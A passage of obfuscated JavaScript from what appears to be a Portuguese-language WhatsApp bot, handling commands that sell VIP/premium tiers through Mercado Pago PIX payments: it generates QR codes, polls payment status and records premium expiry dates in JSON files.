                      }
                    }
                  } while (_0x3adfbe.status_pagamento === "pending");
                  if (_0x3adfbe.status_pagamento === "approved") {
                    _0x403602("Yupppi, obrigado (a) pelo seu apoio. 🥺❤️");
                  } else {}
                } catch (_0x23f897) {
                  console.log(_0x23f897);
                  return _0x403602("⌛ Pagamento Expirado ⌛\nℹ️ Caso tenha pago, ignore. ℹ️");
                }
              }
              break;
            case "vip-1d":
              {
                if (_0x38b1b5) {
                  return _0x403602("Quer comprar Premium novamente? Espere o seu acabar, consulte informações sobre seu VIP em: \"" + _0x1d93be + "infovip\"");
                }
                try {
                  let _0x1852a6 = await fetch(SITE_JEFF_APIS + "/api/mercadopago_pix?token=" + _0x26d981 + "&valor=" + PreçoProduto1(_0x1d93be, _0x32e455) + "&apikey=" + _0x512d5e);
                  let _0x15a8f0 = await _0x1852a6.json();
                  if (!_0x15a8f0.status) {
                    throw new Error("Falha ao gerar informações de pagamento");
                  }
                  const _0x2039a7 = {
                    upload: _0x263319.waUploadToServer
                  };
                  let _0x2b4ca2 = await prepareWAMessageMedia({
                    image: Buffer.from(_0x15a8f0.qr_code, "base64")
                  }, _0x2039a7);
                  const _0x530da2 = "👤 Destinatário: " + _0x15a8f0.destinatario + "\n🏦 Banco: Mercado Pago\n💲 Valor: R$ " + _0x15a8f0.valor + ",00\n🌹 Deseja: Vip 1 Dia.\n\n⚠️ Caso não paguem em até *10 Minutos*, sua compra será cancelada, use " + (_0x1d93be + _0x3dec88) + " novamente.\n💠 Use o *PIX copia e cola* ou o *QR Code* abaixo para completar o depósito.";
                  if (botoes_) {
                    const _0x3cddc0 = {
                      hasMediaAttachment: true,
                      imageMessage: _0x2b4ca2.imageMessage
                    };
                    const _0x31dda7 = {
                      text: _0x530da2
                    };
                    _0x263319.relayMessage(_0x4f1071, {
                      interactiveMessage: {
                        header: _0x3cddc0,
                        headerType: "IMAGE",
                        body: _0x31dda7,
                        nativeFlowMessage: {
                          buttons: [{
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                              display_text: "COPIAR CHAVE PIX",
                              id: "sim",
                              copy_code: "" + _0x15a8f0.chave
                            })
                          }]
                        }
                      }
                    }, {});
                  } else {
                    const _0x3a0cc3 = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, {
                      image: Buffer.from(_0x15a8f0.qr_code, "base64"),
                      caption: _0x530da2,
                      mentions: [_0x32e455]
                    }, _0x3a0cc3).then(() => _0x403602("" + _0x15a8f0.chave));
                  }
                  const _0x49f237 = 600000;
                  const _0x22d39c = Date.now();
                  let _0x2d975d;
                  do {
                    let _0x108c21 = await fetch(SITE_JEFF_APIS + "/api/checkpix?token=" + _0x26d981 + "&id=" + _0x15a8f0.id + "&apikey=" + _0x512d5e);
                    _0x2d975d = await _0x108c21.json();
                    if (_0x2d975d.status_pagamento === "pending") {
                      await sleep(30000);
                      if (Date.now() - _0x22d39c > _0x49f237) {
                        throw new Error("Tempo limite excedido. Pagamento não aprovado.");
                      }
                    }
                  } while (_0x2d975d.status_pagamento === "pending");
                  if (_0x2d975d.status_pagamento === "approved") {
                    const _0x4edf95 = "diario";
                    const _0x2b1ef3 = _0x578612;
                    const _0x48efea = {
                      id: _0x2b1ef3,
                      tipo: _0x4edf95,
                      dataExpiracao: moment.tz("America/Sao_Paulo").add(24, "hours").format("DD/MM [às] HH:mm")
                    };
                    premium.push(_0x48efea);
                    fs.writeFileSync("./DADOS/premium.json", JSON.stringify(premium, null, 2));
                    const _0x19f749 = "./DADOS/" + _0x2b1ef3 + ".json";
                    fs.writeFileSync(_0x19f749, JSON.stringify(_0x48efea, null, 2));
                    _0x263319.updateBlockStatus(_0x32e455, "unblock");
                    const _0x36cad3 = {
                      text: "✅ PAGAMENTO APROVADO ✅\n\n🌹 Adquiriu: 1 dia de premium.\n\n⌛ Veja mais sobre seu premium em \"" + _0x1d93be + "infovip\"\n\n😊 BOM APROVEITO 😊"
                    };
                    const _0x377210 = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x36cad3, _0x377210);
                  }
                } catch (_0x41f27e) {
                  console.log(_0x41f27e);
                  return _0x403602("⌛ Pagamento Expirado ⌛\nℹ️ Caso tenha pago, ignore. ℹ️");
                }
              }
              break;
            case "vip-5d":
              {
                if (_0x38b1b5) {
                  return _0x403602("Quer comprar Premium novamente? Espere o seu acabar, consulte informações sobre seu VIP em: \"" + _0x1d93be + "infovip\"");
                }
                try {
                  let _0x203193 = await fetch(SITE_JEFF_APIS + "/api/mercadopago_pix?token=" + _0x26d981 + "&valor=" + PreçoProduto2(_0x1d93be, _0x32e455) + "&apikey=" + _0x512d5e);
                  let _0x4d9bc7 = await _0x203193.json();
                  if (!_0x4d9bc7.status) {
                    throw new Error("Failed to generate payment information");
                  }
                  const _0x8fedac = {
                    upload: _0x263319.waUploadToServer
                  };
                  let _0xefef28 = await prepareWAMessageMedia({
                    image: Buffer.from(_0x4d9bc7.qr_code, "base64")
                  }, _0x8fedac);
                  const _0x466727 = "👤 Destinatário: " + _0x4d9bc7.destinatario + "\n🏦 Banco: Mercado Pago\n💲 Valor: R$ " + _0x4d9bc7.valor + ",00\n🌹 Deseja: Vip 5 Dias.\n\n⚠️ Caso não paguem em até *10 Minutos*, sua compra será cancelada, use " + (_0x1d93be + _0x3dec88) + " novamente.\n💠 Use o *PIX copia e cola* ou o *QR Code* abaixo para completar o depósito.";
                  if (botoes_) {
                    const _0x5331f8 = {
                      hasMediaAttachment: true,
                      imageMessage: _0xefef28.imageMessage
                    };
                    const _0xb206f = {
                      text: _0x466727
                    };
                    _0x263319.relayMessage(_0x4f1071, {
                      interactiveMessage: {
                        header: _0x5331f8,
                        headerType: "IMAGE",
                        body: _0xb206f,
                        nativeFlowMessage: {
                          buttons: [{
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                              display_text: "COPIAR CHAVE PIX",
                              id: "sim",
                              copy_code: "" + _0x4d9bc7.chave
                            })
                          }]
                        }
                      }
                    }, {});
                  } else {
                    const _0x53f314 = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, {
                      image: Buffer.from(_0x4d9bc7.qr_code, "base64"),
                      caption: _0x466727,
                      mentions: [_0x32e455]
                    }, _0x53f314).then(() => _0x403602("" + _0x4d9bc7.chave));
                  }
                  const _0x374056 = 600000;
                  const _0x2e36ca = Date.now();
                  let _0x4fdb40;
                  do {
                    let _0x17f747 = await fetch(SITE_JEFF_APIS + "/api/checkpix?token=" + _0x26d981 + "&id=" + _0x4d9bc7.id + "&apikey=" + _0x512d5e);
                    _0x4fdb40 = await _0x17f747.json();
                    if (_0x4fdb40.status_pagamento === "pending") {
                      await sleep(30000);
                      if (Date.now() - _0x2e36ca > _0x374056) {
                        throw new Error("Tempo limite excedido. Pagamento não aprovado.");
                      }
                    }
                  } while (_0x4fdb40.status_pagamento === "pending");
                  if (_0x4fdb40.status_pagamento === "approved") {
                    const _0x55ec51 = "diario";
                    const _0x48bed8 = _0x578612;
                    const _0xbf6d86 = {
                      id: _0x48bed8,
                      tipo: _0x55ec51
                    };
                    const _0x15ff9d = _0xbf6d86;
                    if (_0x55ec51 === "diario") {
                      const _0x52f8c2 = moment.tz("America/Sao_Paulo").add(120, "hours");
                      _0x15ff9d.dataExpiracao = _0x52f8c2.format("DD/MM [às] HH:mm");
                    }
                    premium.push(_0x15ff9d);
                    fs.writeFileSync("./DADOS/premium.json", JSON.stringify(premium, null, 2));
                    const _0x3f232a = "./DADOS/" + _0x48bed8 + ".json";
                    fs.writeFileSync(_0x3f232a, JSON.stringify(_0x15ff9d, null, 2));
                    _0x263319.updateBlockStatus(_0x32e455, "unblock");
                    const _0x58dd4b = {
                      text: "✅ PAGAMENTO APROVADO ✅\n\n🌹 Adquiriu: 5 dias de premium.\n\n⌛ Veja mais sobre seu premium em \"" + _0x1d93be + "infovip\"\n\n😊 BOM APROVEITO 😊"
                    };
                    const _0x534f38 = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x58dd4b, _0x534f38);
                  }
                } catch (_0x3799d3) {
                  console.log(_0x3799d3);
                  return _0x403602("⌛ Pagamento Expirado ⌛\nℹ️ Caso tenha pago, ignore. ℹ️");
                }
              }
              break;
            case "vip-7d":
            case "vip-1s":
              {
                if (_0x38b1b5) {
                  return _0x403602("Quer comprar Premium novamente? Espere o seu acabar, consulte informações sobre seu VIP em: \"" + _0x1d93be + "infovip\"");
                }
                try {
                  let _0xfdc354 = await fetch(SITE_JEFF_APIS + "/api/mercadopago_pix?token=" + _0x26d981 + "&valor=" + PreçoProduto3(_0x1d93be, _0x32e455) + "&apikey=" + _0x512d5e);
                  let _0x432f16 = await _0xfdc354.json();
                  if (!_0x432f16.status) {
                    throw new Error("Failed to generate payment information");
                  }
                  const _0x106e49 = {
                    upload: _0x263319.waUploadToServer
                  };
                  let _0x1bc214 = await prepareWAMessageMedia({
                    image: Buffer.from(_0x432f16.qr_code, "base64")
                  }, _0x106e49);
                  const _0xa22357 = "👤 Destinatário: " + _0x432f16.destinatario + "\n🏦 Banco: Mercado Pago\n💲 Valor: R$ " + _0x432f16.valor + ",00\n🌹 Deseja: VIP 1 Semana.\n\n⚠️ Caso não paguem em até *10 Minutos*, sua compra será cancelada, use " + (_0x1d93be + _0x3dec88) + " novamente.\n💠 Use o *PIX copia e cola* ou o *QR Code* abaixo para completar o depósito.";
                  if (botoes_) {
                    const _0x445574 = {
                      hasMediaAttachment: true,
                      imageMessage: _0x1bc214.imageMessage
                    };
                    const _0x5bf542 = {
                      text: _0xa22357
                    };
                    _0x263319.relayMessage(_0x4f1071, {
                      interactiveMessage: {
                        header: _0x445574,
                        headerType: "IMAGE",
                        body: _0x5bf542,
                        nativeFlowMessage: {
                          buttons: [{
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                              display_text: "COPIAR CHAVE PIX",
                              id: "sim",
                              copy_code: "" + _0x432f16.chave
                            })
                          }]
                        }
                      }
                    }, {});
                  } else {
                    const _0x325659 = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, {
                      image: Buffer.from(_0x432f16.qr_code, "base64"),
                      caption: _0xa22357,
                      mentions: [_0x32e455]
                    }, _0x325659).then(() => _0x403602("" + _0x432f16.chave));
                  }
                  const _0x4c5125 = 600000;
                  const _0x5f3d22 = Date.now();
                  let _0x490f4b;
                  do {
                    let _0xa706f = await fetch(SITE_JEFF_APIS + "/api/checkpix?token=" + _0x26d981 + "&id=" + _0x432f16.id + "&apikey=" + _0x512d5e);
                    _0x490f4b = await _0xa706f.json();
                    if (_0x490f4b.status_pagamento === "pending") {
                      await sleep(30000);
                      if (Date.now() - _0x5f3d22 > _0x4c5125) {
                        throw new Error("Tempo limite excedido. Pagamento não aprovado.");
                      }
                    }
                  } while (_0x490f4b.status_pagamento === "pending");
                  if (_0x490f4b.status_pagamento === "approved") {
                    const _0x40ac95 = "semanal";
                    const _0xca6e44 = _0x578612;
                    const _0x236505 = {
                      id: _0xca6e44,
                      tipo: _0x40ac95
                    };
                    const _0x1dbd01 = _0x236505;
                    if (_0x40ac95 === "semanal") {
                      const _0x2c63eb = moment.tz("America/Sao_Paulo").add(7, "days");
                      _0x1dbd01.dataExpiracao = _0x2c63eb.format("DD/MM [às] HH:mm");
                    }
                    premium.push(_0x1dbd01);
                    fs.writeFileSync("./DADOS/premium.json", JSON.stringify(premium, null, 2));
                    const _0x10482d = "./DADOS/" + _0xca6e44 + ".json";
                    fs.writeFileSync(_0x10482d, JSON.stringify(_0x1dbd01, null, 2));
                    _0x263319.updateBlockStatus(_0x32e455, "unblock");
                    const _0x12a9f3 = {
                      text: "✅ PAGAMENTO APROVADO ✅\n\n🌹 Adquiriu: 1 semana / 7 dias de premium.\n\n⌛ Veja mais sobre seu premium em \"" + _0x1d93be + "infovip\"\n\n😊 BOM APROVEITO 😊"
                    };
                    const _0x1a294b = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x12a9f3, _0x1a294b);
                  }
                } catch (_0x559729) {
                  console.log(_0x559729);
                  return _0x403602("⌛ Pagamento Expirado ⌛\nℹ️ Caso tenha pago, ignore. ℹ️");
                }
              }
              break;
            case "vip-2s":
            case "vip-14d":
              {
                if (_0x38b1b5) {
                  return _0x403602("Quer comprar Premium novamente? Espere o seu acabar, consulte informações sobre seu VIP em: \"" + _0x1d93be + "infovip\"");
                }
                try {
                  let _0x393a7f = await fetch(SITE_JEFF_APIS + "/api/mercadopago_pix?token=" + _0x26d981 + "&valor=" + PreçoProduto4(_0x1d93be, _0x32e455) + "&apikey=" + _0x512d5e);
                  let _0x25b4fc = await _0x393a7f.json();
                  if (!_0x25b4fc.status) {
                    throw new Error("Failed to generate payment information");
                  }
                  const _0x1b4c9f = {
                    upload: _0x263319.waUploadToServer
                  };
                  let _0x2acf02 = await prepareWAMessageMedia({
                    image: Buffer.from(_0x25b4fc.qr_code, "base64")
                  }, _0x1b4c9f);
                  const _0x24c792 = "👤 Destinatário: " + _0x25b4fc.destinatario + "\n🏦 Banco: Mercado Pago\n💲 Valor: R$ " + _0x25b4fc.valor + ",00\n🌹 Deseja: VIP 2 Semanas.\n\n⚠️ Caso não paguem em até *10 Minutos*, sua compra será cancelada, use " + (_0x1d93be + _0x3dec88) + " novamente.\n💠 Use o *PIX copia e cola* ou o *QR Code* abaixo para completar o depósito.";
                  if (botoes_) {
                    const _0x2f29b7 = {
                      hasMediaAttachment: true,
                      imageMessage: _0x2acf02.imageMessage
                    };
                    const _0x486a73 = {
                      text: _0x24c792
                    };
                    _0x263319.relayMessage(_0x4f1071, {
                      interactiveMessage: {
                        header: _0x2f29b7,
                        headerType: "IMAGE",
                        body: _0x486a73,
                        nativeFlowMessage: {
                          buttons: [{
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                              display_text: "COPIAR CHAVE PIX",
                              id: "sim",
                              copy_code: "" + _0x25b4fc.chave
                            })
                          }]
                        }
                      }
                    }, {});
                  } else {
                    const _0x2e2ba5 = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, {
                      image: Buffer.from(_0x25b4fc.qr_code, "base64"),
                      caption: _0x24c792,
                      mentions: [_0x32e455]
                    }, _0x2e2ba5).then(() => _0x403602("" + _0x25b4fc.chave));
                  }
                  const _0x3a5a56 = 600000;
                  const _0x78a4de = Date.now();
                  let _0x3b1356;
                  do {
                    let _0x3103a6 = await fetch(SITE_JEFF_APIS + "/api/checkpix?token=" + _0x26d981 + "&id=" + _0x25b4fc.id + "&apikey=" + _0x512d5e);
                    _0x3b1356 = await _0x3103a6.json();
                    if (_0x3b1356.status_pagamento === "pending") {
                      await sleep(30000);
                      if (Date.now() - _0x78a4de > _0x3a5a56) {
                        throw new Error("Tempo limite excedido. Pagamento não aprovado.");
                      }
                    }
                  } while (_0x3b1356.status_pagamento === "pending");
                  if (_0x3b1356.status_pagamento === "approved") {
                    const _0x2466e0 = "semanal";
                    const _0x3cb92d = _0x578612;
                    const _0x2d705b = {
                      id: _0x3cb92d,
                      tipo: _0x2466e0
                    };
                    const _0x318121 = _0x2d705b;
                    if (_0x2466e0 === "semanal") {
                      const _0x519fe6 = moment.tz("America/Sao_Paulo").add(14, "days");
                      _0x318121.dataExpiracao = _0x519fe6.format("DD/MM [às] HH:mm");
                    }
                    premium.push(_0x318121);
                    fs.writeFileSync("./DADOS/premium.json", JSON.stringify(premium, null, 2));
                    const _0x5cb8bd = "./DADOS/" + _0x3cb92d + ".json";
                    fs.writeFileSync(_0x5cb8bd, JSON.stringify(_0x318121, null, 2));
                    _0x263319.updateBlockStatus(_0x32e455, "unblock");
                    const _0x1fad76 = {
                      text: "✅ PAGAMENTO APROVADO ✅\n\n🌹 Adquiriu: 2 semanas / 14 dias de premium.\n\n⌛ Veja mais sobre seu premium em \"" + _0x1d93be + "infovip\"\n\n😊 BOM APROVEITO 😊"
                    };
                    const _0xfc5ea6 = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x1fad76, _0xfc5ea6);
                  }
                } catch (_0x45d92a) {
                  console.log(_0x45d92a);
                  return _0x403602("⌛ Pagamento Expirado ⌛\nℹ️ Caso tenha pago, ignore. ℹ️");
                }
              }
              break;
            case "vip-30d":
            case "vip-1m":
              {
                if (_0x38b1b5) {
                  return _0x403602("Quer comprar Premium novamente? Espere o seu acabar, consulte informações sobre seu VIP em: \"" + _0x1d93be + "infovip\"");
                }
                try {
                  let _0x9cc3b7 = await fetch(SITE_JEFF_APIS + "/api/mercadopago_pix?token=" + _0x26d981 + "&valor=" + PreçoProduto5(_0x1d93be, _0x32e455) + "&apikey=" + _0x512d5e);
                  let _0x11b46b = await _0x9cc3b7.json();
                  if (!_0x11b46b.status) {
                    throw new Error("Failed to generate payment information");
                  }
                  const _0x485523 = {
                    upload: _0x263319.waUploadToServer
                  };
                  let _0x457763 = await prepareWAMessageMedia({
                    image: Buffer.from(_0x11b46b.qr_code, "base64")
                  }, _0x485523);
                  const _0x5058a8 = "👤 Destinatário: " + _0x11b46b.destinatario + "\n🏦 Banco: Mercado Pago\n💲 Valor: R$ " + _0x11b46b.valor + ",00\n🌹 Deseja: VIP 1 Mês.\n\n⚠️ Caso não paguem em até *10 Minutos*, sua compra será cancelada, use " + (_0x1d93be + _0x3dec88) + " novamente.\n💠 Use o *PIX copia e cola* ou o *QR Code* abaixo para completar o depósito.";
                  if (botoes_) {
                    const _0x1ad74f = {
                      hasMediaAttachment: true,
                      imageMessage: _0x457763.imageMessage
                    };
                    const _0x5159fe = {
                      text: _0x5058a8
                    };
                    _0x263319.relayMessage(_0x4f1071, {
                      interactiveMessage: {
                        header: _0x1ad74f,
                        headerType: "IMAGE",
                        body: _0x5159fe,
                        nativeFlowMessage: {
                          buttons: [{
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                              display_text: "COPIAR CHAVE PIX",
                              id: "sim",
                              copy_code: "" + _0x11b46b.chave
                            })
                          }]
                        }
                      }
                    }, {});
                  } else {
                    const _0x4eccee = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, {
                      image: Buffer.from(_0x11b46b.qr_code, "base64"),
                      caption: _0x5058a8,
                      mentions: [_0x32e455]
                    }, _0x4eccee).then(() => _0x403602("" + _0x11b46b.chave));
                  }
                  const _0x1a6875 = 600000;
                  const _0x3b2e06 = Date.now();
                  let _0x46545e;
                  do {
                    let _0x1e8b20 = await fetch(SITE_JEFF_APIS + "/api/checkpix?token=" + _0x26d981 + "&id=" + _0x11b46b.id + "&apikey=" + _0x512d5e);
                    _0x46545e = await _0x1e8b20.json();
                    if (_0x46545e.status_pagamento === "pending") {
                      await sleep(30000);
                      if (Date.now() - _0x3b2e06 > _0x1a6875) {
                        throw new Error("Tempo limite excedido. Pagamento não aprovado.");
                      }
                    }
                  } while (_0x46545e.status_pagamento === "pending");
                  if (_0x46545e.status_pagamento === "approved") {
                    const _0x28db22 = "mensal";
                    const _0x4b6cea = _0x578612;
                    const _0x3104d0 = {
                      id: _0x4b6cea,
                      tipo: _0x28db22
                    };
                    const _0x2d9102 = _0x3104d0;
                    if (_0x28db22 === "mensal") {
                      const _0x3964f4 = moment.tz("America/Sao_Paulo").add(1, "month");
                      _0x2d9102.dataExpiracao = _0x3964f4.format("DD/MM [às] HH:mm");
                    }
                    premium.push(_0x2d9102);
                    fs.writeFileSync("./DADOS/premium.json", JSON.stringify(premium, null, 2));
                    const _0x4dc5da = "./DADOS/" + _0x4b6cea + ".json";
                    fs.writeFileSync(_0x4dc5da, JSON.stringify(_0x2d9102, null, 2));
                    _0x263319.updateBlockStatus(_0x32e455, "unblock");
                    const _0x2fce52 = {
                      text: "✅ PAGAMENTO APROVADO ✅\n\n🌹 Adquiriu: 1 mês / 30 dias de premium.\n\n⌛ Veja mais sobre seu premium em \"" + _0x1d93be + "infovip\"\n\n😊 BOM APROVEITO 😊"
                    };
                    const _0x146c7e = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x2fce52, _0x146c7e);
                  }
                } catch (_0x2bbf8f) {
                  console.log(_0x2bbf8f);
                  return _0x403602("⌛ Pagamento Expirado ⌛\nℹ️ Caso tenha pago, ignore. ℹ️");
                }
              }
              break;
            case "vip-60d":
            case "vip-2m":
              {
                if (_0x38b1b5) {
                  return _0x403602("Quer comprar Premium novamente? Espere o teu acabar, veja informações sobre seu VIP em: \"" + _0x1d93be + "infovip\"");
                }
                try {
                  let _0x4c15b6 = await fetch(SITE_JEFF_APIS + "/api/mercadopago_pix?token=" + _0x26d981 + "&valor=" + PreçoProduto6(_0x1d93be, _0x32e455) + "&apikey=" + _0x512d5e);
                  let _0x5b5a3c = await _0x4c15b6.json();
                  if (!_0x5b5a3c.status) {
                    throw new Error("Failed to generate payment information");
                  }
                  const _0x18c347 = {
                    upload: _0x263319.waUploadToServer
                  };
                  let _0x1dc2ff = await prepareWAMessageMedia({
                    image: Buffer.from(_0x5b5a3c.qr_code, "base64")
                  }, _0x18c347);
                  const _0x40b5ff = "👤 Destinatário: " + _0x5b5a3c.destinatario + "\n🏦 Banco: Mercado Pago\n💲 Valor: R$ " + _0x5b5a3c.valor + ",00\n🌹 Deseja: VIP 2 Meses.\n\n⚠️ Caso não paguem em até *10 Minutos*, sua compra será cancelada, use " + (_0x1d93be + _0x3dec88) + " novamente.\n💠 Use o *PIX copia e cola* ou o *QR Code* abaixo para completar o depósito.";
                  if (botoes_) {
                    const _0x56726f = {
                      hasMediaAttachment: true,
                      imageMessage: _0x1dc2ff.imageMessage
                    };
                    const _0x1d0ea6 = {
                      text: _0x40b5ff
                    };
                    _0x263319.relayMessage(_0x4f1071, {
                      interactiveMessage: {
                        header: _0x56726f,
                        headerType: "IMAGE",
                        body: _0x1d0ea6,
                        nativeFlowMessage: {
                          buttons: [{
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                              display_text: "COPIAR CHAVE PIX",
                              id: "sim",
                              copy_code: "" + _0x5b5a3c.chave
                            })
                          }]
                        }
                      }
                    }, {});
                  } else {
                    const _0x1642d4 = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, {
                      image: Buffer.from(_0x5b5a3c.qr_code, "base64"),
                      caption: _0x40b5ff,
                      mentions: [_0x32e455]
                    }, _0x1642d4).then(() => _0x403602("" + _0x5b5a3c.chave));
                  }
                  const _0xcd0fec = 600000;
                  const _0x5049dc = Date.now();
                  let _0xe560df;
                  do {
                    let _0x335d63 = await fetch(SITE_JEFF_APIS + "/api/checkpix?token=" + _0x26d981 + "&id=" + _0x5b5a3c.id + "&apikey=" + _0x512d5e);
                    _0xe560df = await _0x335d63.json();
                    if (_0xe560df.status_pagamento === "pending") {
                      await sleep(30000);
                      if (Date.now() - _0x5049dc > _0xcd0fec) {
                        throw new Error("Tempo limite excedido. Pagamento não aprovado.");
                      }
                    }
                  } while (_0xe560df.status_pagamento === "pending");
                  if (_0xe560df.status_pagamento === "approved") {
                    const _0x3ae670 = "mensal";
                    const _0x572dba = _0x578612;
                    const _0x43ec2b = {
                      id: _0x572dba,
                      tipo: _0x3ae670
                    };
                    const _0x10f2f8 = _0x43ec2b;
                    if (_0x3ae670 === "mensal") {
                      const _0x11535c = moment.tz("America/Sao_Paulo").add(2, "months");
                      _0x10f2f8.dataExpiracao = _0x11535c.format("DD/MM [às] HH:mm");
                    }
                    premium.push(_0x10f2f8);
                    fs.writeFileSync("./DADOS/premium.json", JSON.stringify(premium, null, 2));
                    const _0x13e9bd = "./DADOS/" + _0x572dba + ".json";
                    fs.writeFileSync(_0x13e9bd, JSON.stringify(_0x10f2f8, null, 2));
                    _0x263319.updateBlockStatus(_0x32e455, "unblock");
                    const _0x457736 = {
                      text: "✅ PAGAMENTO APROVADO ✅\n\n🌹 Adquiriu: 2 meses / 60 dias de premium.\n\n⌛ Veja mais sobre seu premium em \"" + _0x1d93be + "infovip\"\n\n😊 BOM APROVEITO 😊"
                    };
                    const _0x1da6c0 = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x457736, _0x1da6c0);
                  }
                } catch (_0x1d9493) {
                  console.log(_0x1d9493);
                  return _0x403602("⌛ Pagamento Expirado ⌛\nℹ️ Caso tenha pago, ignore. ℹ️");
                }
              }
              break;
            case "vip-90d":
            case "vip-3m":
              {
                if (_0x38b1b5) {
                  return _0x403602("Quer comprar Premium novamente? Espere o teu acabar, veja informações sobre seu VIP em: \"" + _0x1d93be + "infovip\"");
                }
                try {
                  let _0x2b92d2 = await fetch(SITE_JEFF_APIS + "/api/mercadopago_pix?token=" + _0x26d981 + "&valor=" + PreçoProduto7(_0x1d93be, _0x32e455) + "&apikey=" + _0x512d5e);
                  let _0x1a4684 = await _0x2b92d2.json();
                  if (!_0x1a4684.status) {
                    throw new Error("Failed to generate payment information");
                  }
                  const _0x4fba1c = {
                    upload: _0x263319.waUploadToServer
                  };
                  let _0x2e1286 = await prepareWAMessageMedia({
                    image: Buffer.from(_0x1a4684.qr_code, "base64")
                  }, _0x4fba1c);
                  const _0x2eb027 = "👤 Destinatário: " + _0x1a4684.destinatario + "\n🏦 Banco: Mercado Pago\n💲 Valor: R$ " + _0x1a4684.valor + ",00\n🌹 Deseja: VIP 3 Meses.\n\n⚠️ Caso não paguem em até *10 Minutos*, sua compra será cancelada, use " + (_0x1d93be + _0x3dec88) + " novamente.\n💠 Use o *PIX copia e cola* ou o *QR Code* abaixo para completar o depósito.";
                  if (botoes_) {
                    const _0x512cf6 = {
                      hasMediaAttachment: true,
                      imageMessage: _0x2e1286.imageMessage
                    };
                    const _0x49254d = {
                      text: _0x2eb027
                    };
                    _0x263319.relayMessage(_0x4f1071, {
                      interactiveMessage: {
                        header: _0x512cf6,
                        headerType: "IMAGE",
                        body: _0x49254d,
                        nativeFlowMessage: {
                          buttons: [{
                            name: "cta_copy",
                            buttonParamsJson: JSON.stringify({
                              display_text: "COPIAR CHAVE PIX",
                              id: "sim",
                              copy_code: "" + _0x1a4684.chave
                            })
                          }]
                        }
                      }
                    }, {});
                  } else {
                    const _0x1e4fb5 = {
                      quoted: _0x302296
                    };
                    _0x263319.sendMessage(_0x4f1071, {
                      image: Buffer.from(_0x1a4684.qr_code, "base64"),
                      caption: _0x2eb027,
                      mentions: [_0x32e455]
                    }, _0x1e4fb5).then(() => _0x403602("" + _0x1a4684.chave));
                  }
                  const _0x407c38 = 600000;
                  const _0x10adb1 = Date.now();
                  let _0x3ffe92;
                  do {
                    let _0x70bdfa = await fetch(SITE_JEFF_APIS + "/api/checkpix?token=" + _0x26d981 + "&id=" + _0x1a4684.id + "&apikey=" + _0x512d5e);
                    _0x3ffe92 = await _0x70bdfa.json();
                    if (_0x3ffe92.status_pagamento === "pending") {
                      await sleep(30000);
                      if (Date.now() - _0x10adb1 > _0x407c38) {
                        throw new Error("Tempo limite excedido. Pagamento não aprovado.");
                      }
                    }
                  } while (_0x3ffe92.status_pagamento === "pending");
                  if (_0x3ffe92.status_pagamento === "approved") {
                    const _0x2811ff = "mensal";
                    const _0x43b1ed = _0x578612;
                    const _0x10b05f = {
                      id: _0x43b1ed,
                      tipo: _0x2811ff
                    };
                    const _0x23211a = _0x10b05f;
                    if (_0x2811ff === "mensal") {
                      const _0x3aa9a8 = moment.tz("America/Sao_Paulo").add(3, "months");
                      _0x23211a.dataExpiracao = _0x3aa9a8.format("DD/MM [às] HH:mm");
                    }
                    premium.push(_0x23211a);
                    fs.writeFileSync("./DADOS/premium.json", JSON.stringify(premium, null, 2));
                    const _0x2d9ab6 = "./DADOS/" + _0x43b1ed + ".json";
                    fs.writeFileSync(_0x2d9ab6, JSON.stringify(_0x23211a, null, 2));
                    _0x263319.updateBlockStatus(_0x32e455, "unblock");
                    const _0x39580c = {
                      text: "✅ PAGAMENTO APROVADO ✅\n\n🌹 Adquiriu: 3 meses / 90 dias de premium.\n\n⌛ Veja mais sobre seu premium em \"" + _0x1d93be + "infovip\"\n\n😊 BOM APROVEITO 😊"
                    };
                    const _0x9c621f = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, _0x39580c, _0x9c621f);
                  }
                } catch (_0x34a092) {
                  console.log(_0x34a092);
                  return _0x403602("⌛ Pagamento Expirado ⌛\nℹ️ Caso tenha pago, ignore. ℹ️");
                }
              }
              break;
            case "delpremium":
            case "delvip":
              if (!_0x2a5ff3) {
                return _0x403602("só meu papai 😤");
              }
              mentioned = _0x302296.message.extendedTextMessage.contextInfo.mentionedJid;
              const _0x56b6c6 = "" + mentioned[0].split("@")[0];
              const _0x448059 = premium.findIndex(_0x44ae37 => _0x44ae37.id === _0x56b6c6);
              if (_0x448059 !== -1) {
                premium.splice(_0x448059, 1);
                fs.writeFileSync("./DADOS/premium.json", JSON.stringify(premium, null, 2));
                if (fs.existsSync(_0x1ed4d5)) {
                  fs.unlinkSync(_0x1ed4d5);
                }
                const _0x447454 = {
                  text: "❌Usuário " + _0x56b6c6 + " foi removido da lista de usuários premium com sucesso e seu arquivo foi excluído❌"
                };
                const _0x3498eb = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x447454, _0x3498eb);
              } else {
                return _0x403602("O número de telefone especificado não está na lista premium.");
              }
              break;
            case "serpremium":
            case "servip":
              if (!_0x2a5ff3) {
                return _0x403602("so meu papai 😤");
              }
              var _0x2f8fb7 = premium.find(_0x19fa4c => _0x19fa4c.id === _0x578612);
              if (_0x2f8fb7) {
                return _0x403602("*chefe... você ja é um usuário vip '-'*");
              } else {
                const _0x2144e8 = {
                  id: _0x578612,
                  tipo: "permanente"
                };
